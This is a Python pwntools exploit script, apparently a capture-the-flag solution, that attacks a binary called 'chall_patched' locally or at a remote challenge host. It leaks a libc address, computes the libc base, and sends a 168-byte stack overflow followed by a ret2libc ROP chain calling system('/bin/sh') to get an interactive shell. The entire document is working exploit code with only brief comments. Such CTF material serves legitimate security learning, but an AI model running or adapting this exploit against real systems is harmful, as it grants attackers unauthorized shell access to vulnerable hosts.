#!/usr/bin/env python

from pwn import * 

context.arch = 'amd64'
#context.log_level = 'DEBUG'

TARGET = './chall_patched'
HOST = 'chall.ehax.tech'    # nc chall.ehax.tech 4269
PORT = 4269

elf = ELF(TARGET)
libc = ELF('./libc.so.6')
ld = ELF("./ld-2.27.so")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ======================================= #
'''
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
'''

offset = b'A' * 168 # RIP at 169th

### 1st Step == Preparing everything (gadgets, offset, etc) ###

# gadgets & symbols offset
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi'])[0]
wctrans_offset = libc.symbols['wctrans']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh\x00"))

print(f"ret : {hex(ret)}")
print(f"rdi : {hex(pop_rdi)}")
print(f"wctrans : {hex(wctrans_offset)}")
print(f"system : {hex(system_offset)}")
print(f"binsh : {hex(binsh_offset)}")

### 2nd Step == Calculating base address of libc and calculating other functions' address ###

# leaked wctrans, libc base, system()
p.recvline()
out = p.recvuntil(b'0x7')
leaked_wctrans = int((b'0x7' + p.recv()[:11]).decode(), 16)
libc_base = leaked_wctrans - wctrans_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

print(f"leaked_wctrans : {hex(leaked_wctrans)}")
print(f"libc_base : {hex(libc_base)}")
print(f"system : {hex(system)}")
print(f"binsh : {hex(binsh)}")

### 3rd Step == Build payload and send it off to remote target ###

payload = flat(
    offset,
    ret,
    pop_rdi,
    binsh,
    system
)
p.sendline(payload)

p.interactive()
p.close()

# NOTE:
# ret2libc
